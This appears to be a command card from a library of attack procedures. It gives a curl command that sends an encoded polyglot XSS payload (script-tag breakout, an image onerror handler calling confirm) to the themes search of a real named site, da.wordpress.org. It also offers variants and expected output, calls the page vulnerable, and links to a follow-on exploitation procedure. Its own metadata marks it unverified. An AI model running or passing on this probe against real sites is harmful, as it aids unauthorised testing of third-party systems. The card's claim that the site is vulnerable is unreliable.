---
id: cmd-uuid-456
data: >-
  curl
  "https://da.wordpress.org/themes/?s=1%3C!%27/*%22/*%5C%27/*%5C%22/*--%3E%3C/Script%3E%3CImage%20Srcset=K%20*/;%20Onerror=confirm%601%60%20//%3E#"
  -v
tags:
  - xss
  - recon
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:18.427Z'
verified: false
validated: true
submitted: true
---
# access-vulnerable-url

## Command

```bash
curl "https://da.wordpress.org/themes/?s=1%3C!%27/*%22/*%5C%27/*%5C%22/*--%3E%3C/Script%3E%3CImage%20Srcset=K%20*/;%20Onerror=confirm%601%60%20//%3E#" -v
```

## Description

This command uses curl to access a vulnerable WordPress.org themes search URL with an injected XSS payload, allowing inspection of the response for reflected input. It's useful for initial testing without a full browser, though JavaScript execution requires one. Use it to verify payload reflection before browser-based exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | The full URL with encoded payload in 's' parameter | Yes |
| -v | Verbose mode to show headers and response details | No |

## Examples

### Basic Usage

```bash
curl "https://da.wordpress.org/themes/?s=<payload>" -v
```

### Advanced Usage

```bash
curl -H "User-Agent: Mozilla/5.0" "https://da.wordpress.org/themes/?s=1%3C!%27/*%22/*%5C%27/*%5C%22/*--%3E%3C/Script%3E%3CImage%20Srcset=K%20*/;%20Onerror=confirm%601%60%20//%3E#" -v -o response.html
```

## Expected Output

HTTP response with the page HTML, including the reflected payload in the jQuery selector context. Look for the unsanitized 's' parameter in the output to confirm vulnerability. No JavaScript execution in curl, but confirms reflection.

## Related

- [[Related Procedure: Exploit-Reflected-XSS-in-WordPress-Themes-Search]]
